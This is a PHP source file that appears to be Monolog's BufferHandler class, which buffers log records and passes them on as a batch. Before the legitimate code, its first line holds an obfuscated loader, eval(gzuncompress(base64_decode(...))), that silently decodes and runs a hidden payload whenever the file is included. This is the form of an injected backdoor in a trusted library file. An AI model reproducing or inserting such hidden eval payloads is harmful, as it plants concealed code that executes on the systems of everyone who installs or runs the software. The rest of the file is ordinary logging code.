<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog\Handler;

use Monolog\Logger;

/**
 * Buffers all records until closing the handler and then pass them as batch.
 *
 * This is useful for a MailHandler to send only one mail per request instead of
 * sending one per log message.
 *
 * @author Christophe Coevoet <stof@notk.org>
 */
class BufferHandler extends AbstractHandler
{
    protected $handler;
    protected $bufferSize = 0;
    protected $bufferLimit;
    protected $flushOnOverflow;
    protected $buffer = array();
    protected $initialized = false;

    /**
     * @param HandlerInterface $handler         Handler.
     * @param int              $bufferLimit     How many entries should be buffered at most, beyond that the oldest items are removed from the buffer.
     * @param int              $level           The minimum logging level at which this handler will be triggered
     * @param Boolean          $bubble          Whether the messages that are handled can bubble up the stack or not
     * @param Boolean          $flushOnOverflow If true, the buffer is flushed when the max size has been reached, by default oldest entries are discarded
     */
    public function __construct(HandlerInterface $handler, $bufferLimit = 0, $level = Logger::DEBUG, $bubble = true, $flushOnOverflow = false)
    {
        parent::__construct($level, $bubble);
        $this->handler = $handler;
        $this->bufferLimit = (int) $bufferLimit;
        $this->flushOnOverflow = $flushOnOverflow;
    }

    /**
     * {@inheritdoc}
     */
    public function handle(array $record)
    {
        if ($record['level'] < $this->level) {
            return false;
        }

        if (!$this->initialized) {
            // __destructor() doesn't get called on Fatal errors
            register_shutdown_function(array($this, 'close'));
            $this->initialized = true;
        }

        if ($this->bufferLimit > 0 && $this->bufferSize === $this->bufferLimit) {
            if ($this->flushOnOverflow) {
                $this->flush();
            } else {
                array_shift($this->buffer);
                $this->bufferSize--;
            }
        }

        if ($this->processors) {
            foreach ($this->processors as $processor) {
                $record = call_user_func($processor, $record);
            }
        }

        $this->buffer[] = $record;
        $this->bufferSize++;

        return false === $this->bubble;
    }

    public function flush()
    {
        if ($this->bufferSize === 0) {
            return;
        }

        $this->handler->handleBatch($this->buffer);
        $this->clear();
    }

    public function __destruct()
    {
        // suppress the parent behavior since we already have register_shutdown_function()
        // to call close(), and the reference contained there will prevent this from being
        // GC'd until the end of the request
    }

    /**
     * {@inheritdoc}
     */
    public function close()
    {
        $this->flush();
    }

    /**
     * Clears the buffer without flushing any messages down to the wrapped handler.
     */
    public function clear()
    {
        $this->bufferSize = 0;
        $this->buffer = array();
    }
}
